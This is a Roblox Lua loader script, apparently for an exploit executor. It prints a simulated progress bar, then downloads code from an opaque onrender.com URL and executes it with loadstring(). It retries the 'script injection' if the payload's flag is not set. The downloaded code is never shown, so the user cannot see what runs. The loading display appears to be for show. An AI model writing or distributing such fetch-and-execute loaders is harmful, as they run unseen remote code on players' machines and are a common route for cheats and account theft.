local url = "https://protected-roblox-scripts.onrender.com/9223414cdbd6a7e1adc86f722ab25eae"

local function printProgress(percent)
    local barLength = 20
    local filledLength = math.floor(barLength * percent / 100)
    local bar = string.rep("█", filledLength) .. string.rep("░", barLength - filledLength)
    print(string.format("[Loading] %3d%% [%s]", percent, bar))
end

print("[Loading] Warming up the server (simulating real script injection)...")
local warmupSuccess = pcall(function()
    game:HttpGet(url)
end)
if warmupSuccess then
    print("[Loading] Server responded to warmup request.")
else
    warn("[Loading] Warmup request failed, but will continue.")
end
printProgress(20)

for i = 21, 99, 13 do
    wait(0.25)
    printProgress(i)
end

wait(1)
printProgress(100)
print("[Loading] The server is warm, loading the script...")

_G.character_model_updated = false

local function injectScript()
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    if success and result and #result > 0 then
        local ok, err = pcall(function()
            loadstring(result)()
        end)
        if ok then
            print("[Loading] Script loaded successfully!")
            return true
        else
            warn("[Loading] Script error: " .. tostring(err))
        end
    else
        warn("[Loading] Failed to load script.")
    end
    return false
end

injectScript()
wait(1)

if not _G.character_model_updated then
    print("[Loading] Character model not updated, trying to inject the script again...")
    injectScript()
    wait(2)
    if not _G.character_model_updated then
        warn("[Loading] Still no character model update. Please inject script again.")
    end
end
